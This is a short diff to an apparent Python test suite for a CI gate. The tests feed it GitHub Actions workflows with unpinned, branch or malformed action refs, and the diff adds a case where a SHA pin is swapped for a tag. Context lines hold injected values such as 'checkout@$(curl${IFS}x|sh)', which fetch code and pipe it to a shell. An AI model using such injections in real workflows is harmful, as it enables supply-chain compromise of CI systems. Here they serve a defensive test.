@@ -372,6 +372,7 @@ class HlddGateTests(unittest.TestCase):
             "branch ref": {".github/workflows/ci.yml": WORKFLOW.replace("checkout@v7.0.1", "checkout@main")},
             "shell ref": {".github/workflows/ci.yml": WORKFLOW.replace("checkout@v7.0.1", "checkout@$(curl${IFS}x|sh)")},
             "shell comment": {".github/workflows/ci.yml": WORKFLOW.replace("# v7.0.0", "# $(curl example.invalid)")},
+            "SHA pin to tag": {".github/workflows/ci.yml": WORKFLOW.replace(f"setup-node@{'a' * 40} # v7.0.0", "setup-node@v7")},
             **{
                 f"digit-led ref {ref}": {".github/workflows/ci.yml": WORKFLOW.replace("checkout@v7.0.1", f"checkout@{ref}")}
                 for ref in ("1evil", "v1evil", "123main", "1...2", "v7.0.1.2")
